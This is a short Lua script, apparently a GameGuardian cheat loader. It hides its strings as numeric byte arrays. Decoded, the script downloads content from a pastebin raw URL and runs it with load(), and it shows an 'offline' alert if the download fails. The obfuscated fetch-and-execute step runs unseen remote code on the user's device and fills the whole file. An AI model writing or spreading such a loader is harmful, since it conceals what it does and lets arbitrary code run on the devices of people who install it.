function Mf(Cr)
return string.char(table.unpack(Cr)) -- translate
end -----------LAST CONNECT------------
API = _G[Mf({103,103})][Mf({109,97,107,101,82,101,113,117,101,115,116})](Mf({104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,106,113,116,54,57,117,82,78})).content
if not API then
_G[Mf({103,103})][Mf({97,108,101,114,116})](Mf({202,143,225,180,143,225,180,156,32,225,180,128,202,128,225,180,135,32,225,180,143,234,156,176,234,156,176,202,159,201,170,201,180,225,180,135,32,225,180,143,202,128,32,202,143,225,180,143,225,180,156,32,225,180,133,201,170,225,180,133,32,201,180,225,180,143,225,180,155,32,201,162,201,170,225,180,160,225,180,135,32,201,170,201,180,225,180,155,225,180,135,202,128,201,180,225,180,135,225,180,155,32,225,180,128,225,180,132,225,180,132,225,180,135,115,115,33,32,225,180,152,202,159,225,180,135,225,180,128,115,225,180,135,32,225,180,155,202,128,202,143,32,225,180,128,201,162,225,180,128,201,170,201,180,33,32,10,32,201,170,234,156,176,32,115,225,180,155,201,170,202,159,202,159,32,201,180,225,180,143,225,180,155,32,225,180,161,225,180,143,202,128,225,180,139,201,170,201,180,201,162,32,225,180,132,225,180,143,201,180,225,180,155,225,180,128,225,180,132,225,180,155,32,225,180,155,202,156,225,180,135,32,225,180,133,225,180,135,225,180,160,225,180,135,202,159,225,180,143,225,180,152,225,180,135,202,128,32,225,180,143,234,156,176,32,225,180,155,202,156,201,170,115,32,115,225,180,132,202,128,201,170,225,180,152,225,180,155,46,46,46,32,226,157,140}))
noselect()
else
pcall(load(API))
end
